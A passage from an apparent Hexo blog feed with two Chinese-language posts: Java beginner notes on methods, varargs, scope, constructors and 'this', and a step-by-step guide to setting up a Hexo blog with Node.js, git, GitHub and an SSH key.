/*</span><br><span class="line">    * 1. 方法返回类型 </span><br><span class="line">    * 2. 方法的名字</span><br><span class="line">    * 3. 方法的形参</span><br><span class="line">    * 4. 方法体</span><br><span class="line">    * */</span><br></pre></td></tr></table></figure><p>eg</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/25 - 01 -  - 2:23</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">work1</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        A1 a = <span class="keyword">new</span> A1();</span><br><span class="line">        <span class="keyword">if</span>(a.isOdd(<span class="number">2</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是奇数&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是偶数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A1</span></span>&#123;</span><br><span class="line">    <span class="comment">//方法思路</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 1. 方法返回类型: boolean</span></span><br><span class="line"><span class="comment">    * 2. 方法的名字: isOdd</span></span><br><span class="line"><span class="comment">    * 3. 方法的形参: (int num)</span></span><br><span class="line"><span class="comment">    * 4. 方法体 判断num的奇偶性</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isOdd</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line"><span class="comment">//        if(num % 2 != 0)&#123;</span></span><br><span class="line"><span class="comment">//         return true;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else&#123;</span></span><br><span class="line"><span class="comment">//            return false;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//return num % 2 != 0? true:false;</span></span><br><span class="line">        <span class="keyword">return</span> num % <span class="number">2</span> != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>编写类 AA ，有一个方法：判断一个数是奇数 odd 还是偶数, 返回 boolean类型</p><p>根据行、列、字符打印 对应行数和列数的字符，比如：行：4，列：4，字符#,则打印相应的效果</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/25 - 01 -  - 2:23</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">work1</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        A1 a = <span class="keyword">new</span> A1();</span><br><span class="line">        <span class="keyword">if</span>(a.isOdd(<span class="number">2</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是奇数&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是偶数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        a.print(<span class="number">4</span>,<span class="number">5</span>,<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A1</span></span>&#123;</span><br><span class="line">    <span class="comment">//方法思路</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 1. 方法返回类型: boolean</span></span><br><span class="line"><span class="comment">    * 2. 方法的名字: isOdd</span></span><br><span class="line"><span class="comment">    * 3. 方法的形参: (int num)</span></span><br><span class="line"><span class="comment">    * 4. 方法体 判断num的奇偶性</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isOdd</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line"><span class="comment">//        if(num % 2 != 0)&#123;</span></span><br><span class="line"><span class="comment">//         return true;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else&#123;</span></span><br><span class="line"><span class="comment">//            return false;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//return num % 2 != 0? true:false;</span></span><br><span class="line">        <span class="keyword">return</span> num % <span class="number">2</span> != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//方法思路</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 1. 方法返回类型: void</span></span><br><span class="line"><span class="comment">     * 2. 方法的名字: print</span></span><br><span class="line"><span class="comment">     * 3. 方法的形参: (int row,int col,char c)</span></span><br><span class="line"><span class="comment">     * 4. 方法体 打印需要的字符形状</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span> <span class="params">(<span class="keyword">int</span> row,<span class="keyword">int</span> col,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row ; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">                System.out.print(c);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="成员方法传参机制">成员方法传参机制</h2><p>参数是基本数据类型：</p><p>基本数据类型，传递的是值（值拷贝），形参的任何改变不影响实参！</p><p>参数是引用数据类型：</p><p>引用数据类型，传递是地址（传递的也是值，不过这个值是地址），可以通过形参影响实参！</p><h2 id="方法递归调用">方法递归调用</h2><p>递归重要规则</p><ol><li>执行一个方法时，就创建一个新的受保护的独立空间（栈空间）</li><li>方法的局部变量是独立的，不会相互影响，比如n的变量</li><li>如果方法中使用的是引用类型变量（比如数组），就会共享该引用类型的数据</li><li>递归必须向退出递归的条件逼近，否则就会无限递归，出现</li><li>当一个方法执行完毕，或者遇到return，就会返回，遵守谁调用，就将结果返回给谁，同时当方法执行完毕或者返回时，改方法也就执行完毕</li></ol><h2 id="方法重载">方法重载</h2><p>java 中允许同一个类中，多个同名方法的存在，但要求形参列表不一致！</p><p>方法重载的好处</p><ol><li><p>减轻了起名的麻烦</p></li><li><p>减轻了记名的麻烦</p></li></ol><h2 id="重载使用细节">重载使用细节</h2><ul><li>方法名必须相同</li><li>形参列表，必须不同（形参类型或个数或顺序，至少有一个不同，参数名无要求）</li><li>返回类型，无要求</li></ul><h2 id="可变参数">可变参数</h2><p>java 允许将同一个类中多个<strong style="color:red;">同名</strong><span style="background:#bbffff;">同功能</span>但<span style="background:#FFDBBB;">参数个数不同</span>的方法，封装成一个方法。</p><p>就可以通过可变参数实现</p><h3 id="使用语法">使用语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问修饰符 返回类型 方法名(数据类型... 形参名) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>唯一变了的地方就是三个…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.operations.Variable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.VariableElement;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/29 - 01 -  - 17:38</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">variable</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        YY M = <span class="keyword">new</span> YY();</span><br><span class="line"></span><br><span class="line">        System.out.println(M.sum(<span class="number">1</span>,<span class="number">5</span>,<span class="number">1010</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YY</span></span>&#123;</span><br><span class="line">   <span class="comment">/* public int sum(int n1,int n2)&#123;</span></span><br><span class="line"><span class="comment">        return n1 + n2;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    public int sum(int n1,int n2,int n3)&#123;</span></span><br><span class="line"><span class="comment">        return n1 + n2 + n3;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    public int sum(int n1,int n2,int n3,int n4)&#123;</span></span><br><span class="line"><span class="comment">        return n1 + n2 + n3 + n4;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="comment">/*上面三个方法名称相同，功能相同，参数个数不同---&gt;使用可变参数优化*/</span></span><br><span class="line">    <span class="comment">/*1. int... 表示接受的是可变参数，类型是 int ,即可以接收多个 int(0--多)可接受0个也可以接受多个参数</span></span><br><span class="line"><span class="comment">    * 2. 使用可变参数时，可以当做数组来使用 即 nums 可以当做数组</span></span><br><span class="line"><span class="comment">    * 3. 遍历 nums 求和即可</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>... nums)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;接受的参数个数：&quot;</span> + nums.length);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            res += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可变参数注意事项和使用细节">可变参数注意事项和使用细节</h2><ul><li>可变参数的实参可以为0个或者多个</li><li>可变参数的实参可以为数组</li><li>可变参数的本质就是数组</li><li>可变参数可以和普通类型的参数一起放在形参列表，但必须保证可变参数在最后</li><li>一个形参列表中只能出现一个可变参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @Auther: thestar</span><br><span class="line"> * @Date: 2022/1/29 - 01 -  - 18:05</span><br><span class="line"> * @Description: PACKAGE_NAME</span><br><span class="line"> * @version: 1.0</span><br><span class="line"> */</span><br><span class="line">public class variable1 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 这是一个main方法：是程序的入口：</span><br><span class="line">     */</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int[] arr = &#123;1,2,34,5&#125;;</span><br><span class="line">        N B2 =new N();</span><br><span class="line">        B2.B1(arr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class N&#123;</span><br><span class="line">    public void B1(int... nums)&#123;</span><br><span class="line">        System.out.println(&quot;可变参数的长度&quot;+ nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">    public void B2(String name,double... nums)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="作用域">作用域</h2><ol><li>在java编程中，主要的变量就是属性（成员变量）和局部变量</li><li>我们说的局部变量一般（代码块里面也有自己的局部变量）是指在成员方法中定义的变量。</li><li>java中的作用域的分类<ul><li>全局变量：也就是属性（成员变量），作用域为整个类体</li><li>局部变量：也就是除了属性之外的其他变量，作用域为定义它的代码块中</li></ul></li><li>全局变量（属性）可以不赋值,直接使用，因为有默认值，局部变量必须赋值后，才能使用，因为没有默认值</li></ol><h2 id="作用域的注意事项和细节使用">作用域的注意事项和细节使用</h2><ol><li>属性和局部变量可以重名，访问时遵循就近原则。<img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129184436558.png" alt=""></li><li>在同一作用域中，比如在同一个成员方法中，两个局部变量，不能重名。<img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129184612332.png" alt=""></li><li>==属性生命周期较长==，伴随着对象的创建而创建，伴随着对象的销毁而销毁。局部变量，生命周期较短，伴随着它的代码块的执行而创建，伴随着代码块的结束而销毁。即在一次方法调用过程中。</li><li>作用域范围不同<ul><li>全局变量/属性：可以被被本类使用，或其他类使用（通过对象调用）</li><li>局部变量 ：只能在本类中的对应的方法中使用</li></ul></li><li>修饰符不同<ul><li>全局变量/属性可以加修饰符</li><li>局部变量不可以加修饰符</li></ul></li></ol><h2 id="构造器">构造器</h2><h3 id="基本语法">基本语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[修饰符] 方法名(形参列表)&#123;</span><br><span class="line">方法体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>构造器的修饰符可以默认，</p></li><li><p>也可以是 public protected private</p></li><li><p>构造器没有返回值</p></li><li><p>方法名 和类名字必须一样</p></li><li><p>参数列表 和 成员方法一样的规则</p></li><li><p>构造器的调用, 由系统完成</p></li></ol><h3 id="基本介绍">基本介绍</h3><blockquote><p>构造方法又叫构造器(constructor)，是类的一种特殊的方法，它的主要作用是完成对新对象的初始化。</p></blockquote><h4 id="它的特点">它的特点</h4><ol><li>方法名和类名相同</li><li>没有返回值</li><li>在创建对象时，系统会自动的调用该类的构造器完成对象的初始化</li></ol><h2 id="构造器的注意事项和使用细节">构造器的注意事项和使用细节</h2><ol><li>一个类可以定义多个不同的构造器，即构造器重载</li><li>构造器名和类名要相同</li><li>构造器没有返回值</li><li>构造器是完成对象的初始化，并不是创建对象</li><li>在创建对象时，系统自动的调用该类的构造方法</li><li>如果程序员没有定义构造器，系统会自动给类生成一个默认无参构造器（也叫默认构造器）==可以用javap指令反编译看看==</li><li>一旦定义了自己的构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非显式的定义一下</li></ol><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129192828845.png" alt="系统默认的构造器"></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129192903518.png" alt="自己创建的构造器"></p><h2 id="对象创建的流程">对象创建的流程</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129194702550.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129194727460.png" alt=""></p><h2 id="流程分析">流程分析</h2><ol><li>加载person类的信息（person.class）只会加载一次</li><li>在堆中分配内存空间（地址）</li><li><span style="background:#BBFFBB;">完成对象的初始化</span></li></ol><ul><li>默认初始化 age=0,name=null</li><li>显示初始化 age=90,name=null</li><li>构造器初始化 age=20,name=小倩</li></ul><ol start="4"><li>在对象在堆中的地址，返回给p（p是对象名，可以理解为对对象的引用）</li></ol><h2 id="this关键字">this关键字</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129195859117.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129200724127.png" alt=""></p><blockquote><p>使用hashcode看一下对象的情况</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220129200854248.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import static java.awt.SystemColor.info;</span><br><span class="line"></span><br><span class="line">public class Dog&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">            Dog1 dog2 = new Dog1(&quot;lili&quot;);</span><br><span class="line">            System.out.println(dog2.hashCode());</span><br><span class="line">            dog2.info();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Dog1&#123;</span><br><span class="line">    String name;</span><br><span class="line">    public Dog1(String name)&#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        System.out.println(this.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">    public void info()&#123;//成员方法,输出属性 x 信息</span><br><span class="line">        System.out.println(&quot;this.hashCode=&quot; + this.hashCode());</span><br><span class="line">        System.out.println(name + &quot;\t&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以将哈希值当成对象地址（但不是真的）</p></blockquote><blockquote><p>简单说，那个对象调用this,this就代表那个对象</p></blockquote><h2 id="this使用细节和注意事项">this使用细节和注意事项</h2><ol><li>this 关键字可以用来访问本类的属性、方法、构造器</li><li>this 用于区分当前类的属性和局部变量</li><li>访问成员方法的语法：this.方法名(参数列表);</li><li>访问构造器语法： <strong style="color:red;">注意只能在构造器中使用(即只能在构造器中访问另外一个构造器, 必须放在第一条语句) </strong></li><li>this 不能在类定义的外部使用，只能在类定义的方法中使用。</li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搭建博客</title>
      <link href="//b37651.html"/>
      <url>//b37651.html</url>
      
        <content type="html"><![CDATA[<h1>hexo博客搭建日志</h1><h2 id="博客概述">博客概述</h2><p>什么是博客（下面是百度百科的答案）</p><p><img src="https://pic.imgdb.cn/item/61e649572ab3f51d91d8734d.png" alt="image-20220118130006543"></p><blockquote><p>我个人理解博客就是记录生活与学习的一个平台</p><p>任何人都可以拥有一个博客，无论你是什么专业什么职业，只要你有记录生活和学习的要求，或者网络上属于自己宁静的一块地方</p></blockquote><h2 id="前置准备条件">前置准备条件</h2><ol><li>node js下载安装</li><li>git下载安装</li><li>hexo 安装</li><li>github仓库/gitee仓库/coding仓库搭建（建议跟我一样选择github仓库）</li></ol><blockquote><p>利用hexo搭建博客的好处就是，对服务器要求不高，网站是托管给别人的</p></blockquote><h3 id="node-js下载安装">node js下载安装</h3><p><img src="https://pic.imgdb.cn/item/61e648e12ab3f51d91d80ee1.png" alt="image-20220118125808341"></p><p>下载安装即可</p><h3 id="git下载安装">git下载安装</h3><p><img src="https://pic.imgdb.cn/item/61e64afa2ab3f51d91d9be65.png" alt="image-20220118130705258"></p><blockquote><p>讲一下细节，node js以前是需要配置环境变量的，我搭博客的时候去看环境变量自己加上了，我就没有去配置了，我过来人的身份说，不需要自己配置环境变量了</p><p>git安装一直下去就行，path地方一定要勾选</p></blockquote><p>检验node js和git安装是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e64cf12ab3f51d91db3d81.png" alt="image-20220118131527048"></p><blockquote><p>npm是node js里面的东西，相当于python里面的pip一样，它和pip一样源都是国外的，所以可以换源，npm可以换成淘宝源cnpm，有想法的自己可以去换源</p></blockquote><h3 id="hexo安装">hexo安装</h3><blockquote><p>不好意思，上次那个命令是错的(应该是下面这个安装命令)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><blockquote><p>记住，一定要管理员方式命令打开终端安装不然会报错erro</p></blockquote><p>然后检验是否安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e64e382ab3f51d91dc5179.png" alt="image-20220118132054250"></p><h3 id="github仓库">github仓库</h3><p>首先你得有个GitHub账号（访问github慢只是代表你没有科学上网）</p><blockquote><p>解释一下为什么需要github这些仓库，因为我们需要把网页放在服务器上，而这个仓库就相当于一台服务器存储我们博客的内容</p><p>hexo博客里面的内容</p><p>这个仓库不是所有的仓库都可以，一个账号只有一个，而且命名固定，所以我们GitHub用户名和注册邮箱非常重要</p></blockquote><p><img src="https://pic.imgdb.cn/item/61e64fc72ab3f51d91dd8364.png" alt="image-20220118132734844"></p><p><img src="https://pic.imgdb.cn/item/61e6506f2ab3f51d91de4124.png" alt="image-20220118133022756"></p><blockquote><p>desciption描述的意思，可写可不写</p></blockquote><p><img src="https://pic.imgdb.cn/item/61e650ac2ab3f51d91de6e07.png" alt="image-20220118133124153"></p><p>创建完是这样就代表成功了</p><p>注意是main分支还是master分支（20年8月后创建仓库都是main分支，这个可以去设置里面修改，我比较喜欢main分支我没有改，包括我把gitee默认的分支也改成了main分支）</p><p>这个后面是main分支或者master分支非常重要，影响你是否能把代码成功传入仓库</p><h2 id="关联">关联</h2><h3 id="ssh密钥（不一定知道这个是什么，跟着操作就行）">ssh密钥（不一定知道这个是什么，跟着操作就行）</h3><p>新建一个文件夹，或者随便一个文件夹都行，建议新建一个</p><p><img src="https://pic.imgdb.cn/item/61e6527f2ab3f51d91e05ef5.png" alt="image-20220118133910120"></p><p>我已经创建了一个blog文件夹了，所以我这次名为cloud，你们可以命名为blog</p><p><img src="https://pic.imgdb.cn/item/61e652f62ab3f51d91e0caf3.png" alt="image-20220118134109438"></p><p>然后右键git bash here</p><p>不要被界面吓到了，我们只需要敲命令即可</p><p>首先输入ssh检验一下系统是否安装了ssh，默认我们在安装git的时候已经安装上了</p><p><img src="https://pic.imgdb.cn/item/61e6537f2ab3f51d91e13ecd.png" alt="image-20220118134327248"></p><p>然后就是生成ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e6542b2ab3f51d91e1e6dd.png" alt="image-20220118134619283"></p><blockquote><p>记住这里的邮件地址是我们注册github账号的邮件地址</p></blockquote><p><img src="https://pic.imgdb.cn/item/61e654cd2ab3f51d91e265b0.png" alt="image-20220118134900108"></p><p>输入进去按4次回车就行了（什么都不用管按4次回车）</p><p>后面会出现一串rsa图案</p><p><img src="https://pic.imgdb.cn/item/61e6557b2ab3f51d91e30106.png" alt="image-20220118135154897"></p><p><img src="https://pic.imgdb.cn/item/61e655c62ab3f51d91e342b1.png" alt="image-20220118135309114"></p><p>然后找到pub文件格式的这个文件，记得打开文件后缀显示</p><p><img src="https://pic.imgdb.cn/item/61e656092ab3f51d91e383f4.png" alt="image-20220118135416261"></p><p>用记事本打开全选复制</p><p>然后去github设置里面（点击头像setting）然后找到ssh</p><p><img src="https://pic.imgdb.cn/item/61e656622ab3f51d91e3dad6.png" alt="image-20220118135546123"></p><p><img src="https://pic.imgdb.cn/item/61e656f12ab3f51d91e45028.png" alt="image-20220118135808641"></p><p>然后点击第一个add new标题随便写，下面复制我们刚才复制的密钥</p><p>然后测试ssh是否绑定成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e6576c2ab3f51d91e4d26d.png" alt="image-20220118140012248"></p><p>你们应该有个地方输入yes，然后出来我这一串，因为我之前绑定我另一个github账号</p><p>出来这一句就代表成功了</p><h2 id="本地博客生成内容">本地博客生成内容</h2><p>为了让你不被报错，建议重新打开git bash</p><p><img src="https://pic.imgdb.cn/item/61e6582a2ab3f51d91e5751e.png" 